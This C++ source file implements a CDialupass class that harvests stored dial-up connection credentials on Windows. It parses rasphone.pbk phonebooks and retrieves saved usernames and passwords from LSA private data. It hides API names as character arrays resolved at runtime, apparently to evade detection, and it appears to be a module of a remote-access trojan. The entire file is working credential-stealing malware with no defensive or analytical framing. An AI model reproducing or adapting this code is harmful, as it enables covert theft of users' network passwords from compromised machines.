// Dialupass.cpp: implementation of the CDialupass class.
//
//////////////////////////////////////////////////////////////////////
#include "../Declare.h"   //动态调用库函数
#include "Dialupass.h"
#include "until.h"
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;
//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////
typedef NTSTATUS
(NTAPI
*LsaCloseT)(
    __in LSA_HANDLE ObjectHandle
    );
typedef NTSTATUS
(NTAPI
*LsaRetrievePrivateDataT)(
    __in LSA_HANDLE PolicyHandle,
    __in PLSA_UNICODE_STRING KeyName,
    __out PLSA_UNICODE_STRING * PrivateData
    );
typedef NTSTATUS
(NTAPI
*LsaOpenPolicyT)(
    __in_opt PLSA_UNICODE_STRING SystemName,
    __in PLSA_OBJECT_ATTRIBUTES ObjectAttributes,
    __in ACCESS_MASK DesiredAccess,
    __out PLSA_HANDLE PolicyHandle
    );
typedef NTSTATUS
(NTAPI
*LsaFreeMemoryT)(
    __in_opt PVOID Buffer
    );




//////////////////////////////////////////////////////////////////////////////



CDialupass::CDialupass()
{
    m_nMax = 0;
	m_lpCurrentUser = GetCurrentLoginUser();
	m_nRasCount = GetRasEntryCount();
	m_PassWords = new PASSWORDS[m_nRasCount];
	OneInfo = new COneInfo* [m_nRasCount];
	m_nUsed = 0;
	m_nCount = 0;	
	GetRasEntries();
}

CDialupass::~CDialupass()
{
    for(int i=0; i<m_nRasCount; i++)
        delete OneInfo[i];
	delete m_PassWords;
	if (!m_lpCurrentUser)
		delete m_lpCurrentUser;
}

DWORD CDialupass::GetRasEntryCount()
{
	int		nCount = 0;
	char	*lpPhoneBook[2];
    char	szPhoneBook1[MAX_PATH+1], szPhoneBook2[MAX_PATH+1];
	GetWindowsDirectoryAT pGetWindowsDirectoryA=(GetWindowsDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetWindowsDirectoryA");
	pGetWindowsDirectoryA(szPhoneBook1, sizeof(szPhoneBook1));

	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	plstrcpyA(Gyfunction->my_strchr(szPhoneBook1, '\\') + 1, "Documents and Settings\\");
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	plstrcatA(szPhoneBook1, m_lpCurrentUser);
	plstrcatA(szPhoneBook1, "\\Application Data\\Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");

	char CtxPW39[] = {'S','H','G','e','t','S','p','e','c','i','a','l','F','o','l','d','e','r','P','a','t','h','A','\0'};
	SHGetSpecialFolderPathAT pSHGetSpecialFolderPathA=(SHGetSpecialFolderPathAT)GetProcAddress(LoadLibrary("SHELL32.dll"),CtxPW39);
    pSHGetSpecialFolderPathA(NULL,szPhoneBook2, 0x23, 0);

	char DQeBW01[] = {'%','s','\\','%','s','\0'};
    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(szPhoneBook2,DQeBW01, szPhoneBook2, "Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");

	lpPhoneBook[0] = szPhoneBook1;
	lpPhoneBook[1] = szPhoneBook2;

	DWORD	nSize = 1024 * 4;
	char	*lpszReturnBuffer = new char[nSize];
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	for (int i = 0; i < sizeof(lpPhoneBook) / sizeof(int); i++)
	{
		memset(lpszReturnBuffer, 0, nSize);
		GetPrivateProfileSectionNamesAT pGetPrivateProfileSectionNamesA=(GetPrivateProfileSectionNamesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetPrivateProfileSectionNamesA");
		pGetPrivateProfileSectionNamesA(lpszReturnBuffer, nSize, lpPhoneBook[i]);
		for(char *lpSection = lpszReturnBuffer; *lpSection != '\0'; lpSection += plstrlenA(lpSection) + 1)
		{
			nCount++;
		}
	}
	delete lpszReturnBuffer;
	return nCount;
}

LPTSTR CDialupass::GetLocalSid()
{
	union
	{
	SID s;
	char c[256];
	}Sid;
	DWORD sizeSid=sizeof(Sid);
	char DomainName[256];
	DWORD sizeDomainName=sizeof(DomainName);
	SID_NAME_USE peUse;
	LPSTR pSid;


	if (m_lpCurrentUser == NULL)
		return NULL;

	char CtxPW31[] = {'L','o','o','k','u','p','A','c','c','o','u','n','t','N','a','m','e','A','\0'};
	LookupAccountNameAT pLookupAccountNameA=(LookupAccountNameAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW31);
	if(!pLookupAccountNameA(NULL,m_lpCurrentUser,(SID*)&Sid,&sizeSid,DomainName,&sizeDomainName,&peUse))return NULL;

	char HrFvD01[] = {'I','s','V','a','l','i','d','S','i','d','\0'};
	IsValidSidT pIsValidSid=(IsValidSidT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD01);
	if(!pIsValidSid(&Sid))return NULL;


	typedef BOOL  (WINAPI *ConvertSid2StringSid)(PSID  , LPTSTR *);
	ConvertSid2StringSid proc;
	HINSTANCE	hLibrary = LoadLibrary("advapi32.dll");
	proc = (ConvertSid2StringSid) GetProcAddress(hLibrary, "ConvertSidToStringSidA");
	if(proc)   proc((SID*)&Sid.s,&pSid);

	char FBwWp02[] = {'F','r','e','e','L','i','b','r','a','r','y','\0'};
	FreeLibraryT pFreeLibrary=(FreeLibraryT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp02);
	pFreeLibrary(hLibrary);
	return pSid;
}


void CDialupass::AnsiStringToLsaStr(LPSTR AValue,PLSA_UNICODE_STRING lsa)
{
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	lsa->Length=plstrlenA(AValue)*2;
	lsa->MaximumLength=lsa->Length+2;
	lsa->Buffer=(PWSTR)malloc(lsa->MaximumLength);
	char FBwWp19[] = {'M','u','l','t','i','B','y','t','e','T','o','W','i','d','e','C','h','a','r','\0'};
	MultiByteToWideCharT pMultiByteToWideChar=(MultiByteToWideCharT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp19);
	pMultiByteToWideChar(NULL,NULL,(LPCSTR)AValue,plstrlenA(AValue),lsa->Buffer,lsa->MaximumLength);
}


PLSA_UNICODE_STRING CDialupass::GetLsaData(LPSTR KeyName)
{
	LSA_OBJECT_ATTRIBUTES LsaObjectAttribs;
	LSA_HANDLE LsaHandle;
	LSA_UNICODE_STRING LsaKeyName;
	NTSTATUS nts;
	PLSA_UNICODE_STRING OutData;

	ZeroMemory(&LsaObjectAttribs,sizeof(LsaObjectAttribs));

	char HrFvD04[] = {'L','s','a','O','p','e','n','P','o','l','i','c','y','\0'};
	LsaOpenPolicyT pLsaOpenPolicy=(LsaOpenPolicyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD04);
	nts=pLsaOpenPolicy(NULL,&LsaObjectAttribs,POLICY_GET_PRIVATE_INFORMATION,&LsaHandle);
	if(nts!=0)return NULL;
	AnsiStringToLsaStr(KeyName, &LsaKeyName);

	char HrFvD03[] = {'L','s','a','R','e','t','r','i','e','v','e','P','r','i','v','a','t','e','D','a','t','a','\0'};
	LsaRetrievePrivateDataT pLsaRetrievePrivateData=(LsaRetrievePrivateDataT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD03);
	nts=pLsaRetrievePrivateData(LsaHandle, &LsaKeyName,&OutData);
	if(nts!=0)return NULL;

	char HrFvD02[] = {'L','s','a','C','l','o','s','e','\0'};
	LsaCloseT pLsaClose=(LsaCloseT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD02);
	nts=pLsaClose(LsaHandle);
	if(nts!=0)return NULL;
	return OutData;
}
/////////
void CDialupass::ParseLsaBuffer(LPCWSTR Buffer,USHORT Length)
{
	char AnsiPsw[1024];
	char chr,PswStr[256];
	PswStr[0]=0;
	char DYrEN32[] = {'W','i','d','e','C','h','a','r','T','o','M','u','l','t','i','B','y','t','e','\0'};
	WideCharToMultiByteT pWideCharToMultiByte=(WideCharToMultiByteT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN32);
	pWideCharToMultiByte(0,NULL,Buffer,Length,AnsiPsw,1024,0,0);

	for(int i=0,SpacePos=0,TXT=0;i<Length/2-2;i++)
	{
	  chr=AnsiPsw[i];
	  if(chr==0)
	  {
		SpacePos++;
		switch(SpacePos)
		{
			case 1:
			PswStr[TXT]=chr;
			strcpy(m_PassWords[m_nUsed].UID,PswStr);
			break;
			case 6:
			PswStr[TXT]=chr;
			strcpy(m_PassWords[m_nUsed].login,PswStr);
			break;
			case 7:
			PswStr[TXT]=chr;
			strcpy(m_PassWords[m_nUsed].pass,PswStr);
			m_PassWords[m_nUsed].used=false;
			m_nUsed++;
			break;
		}
		ZeroMemory(PswStr,256);
		TXT=0;
	  }
	  else 
	  {
		PswStr[TXT]=chr;
		TXT++;
	  }
	  if(SpacePos==9)SpacePos=0;
	}
}
///////////
void CDialupass::GetLsaPasswords()
{
	PLSA_UNICODE_STRING PrivateData;
//	char Win2k[]="RasDialParams!%s#0";
//	char WinXP[]="L$_RasDefaultCredentials#0";
	char Win2k[] = {'R','a','s','D','i','a','l','P','a','r','a','m','s','!','%','s','#','0','\0'};
	char WinXP[] = {'L','$','_','R','a','s','D','e','f','a','u','l','t','C','r','e','d','e','n','t','i','a','l','s','#','0','\0'};
	char temp[256];

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(temp,Win2k,GetLocalSid());

	PrivateData=GetLsaData(temp);
	char HrFvD05[] = {'L','s','a','F','r','e','e','M','e','m','o','r','y','\0'};
	LsaFreeMemoryT pLsaFreeMemory=(LsaFreeMemoryT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD05);
	if(PrivateData!=NULL)
	{
	ParseLsaBuffer(PrivateData->Buffer,PrivateData->Length);
	pLsaFreeMemory(PrivateData->Buffer); 
	}

	PrivateData=GetLsaData(WinXP);
	if(PrivateData!=NULL)
	{ 
	ParseLsaBuffer(PrivateData->Buffer,PrivateData->Length);
	pLsaFreeMemory(PrivateData->Buffer); 
	}
}


bool CDialupass::GetRasEntries()
{

	int		nCount = 0;
	char	*lpPhoneBook[2];
    char	szPhoneBook1[MAX_PATH+1], szPhoneBook2[MAX_PATH+1];
	GetWindowsDirectoryAT pGetWindowsDirectoryA=(GetWindowsDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetWindowsDirectoryA");
	pGetWindowsDirectoryA(szPhoneBook1, sizeof(szPhoneBook1));

	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	plstrcpyA(Gyfunction->my_strchr(szPhoneBook1, '\\') + 1, "Documents and Settings\\");
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	plstrcatA(szPhoneBook1, m_lpCurrentUser);
	plstrcatA(szPhoneBook1, "\\Application Data\\Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");
	char CtxPW39[] = {'S','H','G','e','t','S','p','e','c','i','a','l','F','o','l','d','e','r','P','a','t','h','A','\0'};
	SHGetSpecialFolderPathAT pSHGetSpecialFolderPathA=(SHGetSpecialFolderPathAT)GetProcAddress(LoadLibrary("SHELL32.dll"),CtxPW39);
    pSHGetSpecialFolderPathA(NULL,szPhoneBook2, 0x23, 0);

	char DQeBW01[] = {'%','s','\\','%','s','\0'};
    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(szPhoneBook2,DQeBW01, szPhoneBook2, "Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");
	
	lpPhoneBook[0] = szPhoneBook1;
	lpPhoneBook[1] = szPhoneBook2;
	
	
	OSVERSIONINFO osi;
	osi.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	char FBwWp05[] = {'G','e','t','V','e','r','s','i','o','n','E','x','A','\0'};
	GetVersionExAT pGetVersionExA=(GetVersionExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp05);
    pGetVersionExA(&osi);
	
	if(osi.dwPlatformId == VER_PLATFORM_WIN32_NT && osi.dwMajorVersion >= 5)
	{
		GetLsaPasswords();
	}	

	DWORD	nSize = 1024 * 4;
	char	*lpszReturnBuffer = new char[nSize];
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	for (int i = 0; i < sizeof(lpPhoneBook) / sizeof(int); i++)
	{
		memset(lpszReturnBuffer, 0, nSize);
		GetPrivateProfileSectionNamesAT pGetPrivateProfileSectionNamesA=(GetPrivateProfileSectionNamesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetPrivateProfileSectionNamesA");
		pGetPrivateProfileSectionNamesA(lpszReturnBuffer, nSize, lpPhoneBook[i]);
		for(char *lpSection = lpszReturnBuffer; *lpSection != '\0'; lpSection += plstrlenA(lpSection) + 1)
		{	
			char	*lpRealSection = (char *)UTF8ToGB2312(lpSection);
			char	strDialParamsUID[256];
			char	strUserName[256];
			char	strPassWord[256];
			char	strPhoneNumber[256];
			char	strDevice[256];
			memset(strDialParamsUID, 0, sizeof(strDialParamsUID));
			memset(strUserName, 0, sizeof(strUserName));
			memset(strPassWord, 0, sizeof(strPassWord));
			memset(strPhoneNumber, 0, sizeof(strPhoneNumber));
			memset(strDevice, 0, sizeof(strDevice));


			char FBwWp04[] = {'G','e','t','P','r','i','v','a','t','e','P','r','o','f','i','l','e','S','t','r','i','n','g','A','\0'};
			GetPrivateProfileStringAT pGetPrivateProfileStringA=(GetPrivateProfileStringAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp04);
			int	nBufferLen = pGetPrivateProfileStringA(lpSection, "DialParamsUID", 0, 
				strDialParamsUID, sizeof(strDialParamsUID),	lpPhoneBook[i]);

			char FBwWp03[] = {'l','s','t','r','c','m','p','A','\0'};
			lstrcmpAT plstrcmpA=(lstrcmpAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp03);
			if (nBufferLen > 0)//DialParamsUID=4326020    198064
			{
				for(int j=0; j< (int)m_nRasCount; j++)
				{
					if(plstrcmpA(strDialParamsUID, m_PassWords[j].UID)==0)
					{
						plstrcpyA(strUserName, m_PassWords[j].login); 
						plstrcpyA(strPassWord, m_PassWords[j].pass); 
						m_PassWords[j].used=true;
						m_nUsed++;
						break;
					}
				}
			}

			pGetPrivateProfileStringA(lpSection, "PhoneNumber", 0, 
				strPhoneNumber, sizeof(strDialParamsUID),	lpPhoneBook[i]);
			pGetPrivateProfileStringA(lpSection, "Device", 0, 
				strDevice, sizeof(strDialParamsUID),	lpPhoneBook[i]);
			char *lpRealDevice = (char *)UTF8ToGB2312(strDevice);
			char *lpRealUserName = (char *)UTF8ToGB2312(strUserName);
	 		Set(strDialParamsUID, lpRealSection, lpRealUserName, strPassWord,
 			strPhoneNumber, lpRealDevice);
//			delete	lpRealSection;
//			delete	lpRealUserName;
//			delete	lpRealDevice;
		}
	}
	delete lpszReturnBuffer;

	return true;
}

BOOL CDialupass::Set(char *DialParamsUID, char *Name,char *User,char *Password,char *PhoneNumber, char *Device)
{
	for(int i=0; i<m_nMax; i++){
        if(0==strcmp(OneInfo[i]->Get(STR_DialParamsUID), DialParamsUID)){

            if(Name!=NULL)
                OneInfo[i]->Set(STR_Name,Name);
            if(User!=NULL)
                OneInfo[i]->Set(STR_User,User);
            if(Password!=NULL)
                OneInfo[i]->Set(STR_Password,Password);
            if(PhoneNumber!=NULL)
                OneInfo[i]->Set(STR_PhoneNumber,PhoneNumber);
            if(Device!=NULL)
                OneInfo[i]->Set(STR_Device, Device);
            return TRUE;
        }
    }

    if(m_nMax < m_nRasCount){

        OneInfo[m_nMax] = new COneInfo;
		OneInfo[m_nMax]->Set(STR_DialParamsUID,DialParamsUID);
        OneInfo[m_nMax]->Set(STR_Name,Name);
        OneInfo[m_nMax]->Set(STR_User,User);
        OneInfo[m_nMax]->Set(STR_Password,Password);
        OneInfo[m_nMax]->Set(STR_PhoneNumber,PhoneNumber);
        OneInfo[m_nMax]->Set(STR_Device,Device);
        m_nMax ++;
        return TRUE;
    }
	return false;
}

LPCTSTR CDialupass::UTF8ToGB2312(char UTF8Str[])
{
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (UTF8Str == NULL || plstrlenA(UTF8Str) == 0)
		return "";
	int	nStrLen = plstrlenA(UTF8Str) * 2;
	char *lpWideCharStr = new char[nStrLen];
	char *lpMultiByteStr = new char[nStrLen];

	char FBwWp19[] = {'M','u','l','t','i','B','y','t','e','T','o','W','i','d','e','C','h','a','r','\0'};
	MultiByteToWideCharT pMultiByteToWideChar=(MultiByteToWideCharT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp19);
	pMultiByteToWideChar(CP_UTF8, 0, UTF8Str, -1, (LPWSTR)lpWideCharStr, nStrLen);
	char DYrEN32[] = {'W','i','d','e','C','h','a','r','T','o','M','u','l','t','i','B','y','t','e','\0'};
	WideCharToMultiByteT pWideCharToMultiByte=(WideCharToMultiByteT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN32);
	pWideCharToMultiByte(CP_ACP, 0, (LPWSTR)lpWideCharStr, -1, lpMultiByteStr, nStrLen, 0, 0);

	delete lpWideCharStr;
	return lpMultiByteStr;
}
